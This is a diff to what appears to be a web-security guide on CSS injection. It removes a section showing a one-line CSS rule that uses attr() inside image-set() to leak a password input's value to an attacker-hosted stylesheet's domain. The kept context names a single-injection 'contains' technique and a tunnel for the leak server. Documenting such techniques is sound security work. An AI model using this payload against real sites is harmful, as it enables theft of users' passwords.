@@ -165,24 +165,6 @@ After your install the tool, set up its arguments and it will host a server on l
 {% embed url="https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/do-more-with-tunnels/trycloudflare/" %}
 {% endhint %}
 
-### One-shot with `attr()`
-
-Due to [a recent update](https://developer.chrome.com/blog/advanced-attr) to the attr() function in CSS, it is possible to get a value of an attribute into a CSS variable. This means it can be used in a function like [`image-set()`](https://developer.mozilla.org/en-US/docs/Web/CSS/image/image-set) to load its value as a relative URL. If the stylesheet was loaded from an attacker's domain, the URL will be relative to the malicious stylesheet's domain:
-
-```css
-input[name="password"] {
-  background: image-set(attr(value))
-}
-```
-
-> `GET /[leak] HTTP/1.1`
-
-The beauty of this is that it can **leak arbitrarily large attributes all in this single request**. Read more about this find by [@slonser in this tweet](https://web.archive.org/web/20250514150052/https://unrollnow.com/status/1912060407344201738).
-
-{% hint style="warning" %}
-**Note**: while this technique works great for any attributes, `<input type=hidden>` is impossible to leak with this method because such an element cannot have a background, so the request is not made.
-{% endhint %}
-
 ### One-shot using 'contains' operator
 
 While most techniques for leaking attributes do it one character at a time with the _prefix_ operator (`^=`), there is also the _contains_ operator (`*=`). By writing many partial substrings of text, you can find which ones exist on the target page and then combine them on the server into a single string. This makes it possible to leak an entire string from one single injection. It was the solution to the following challenge, with a writeup below:
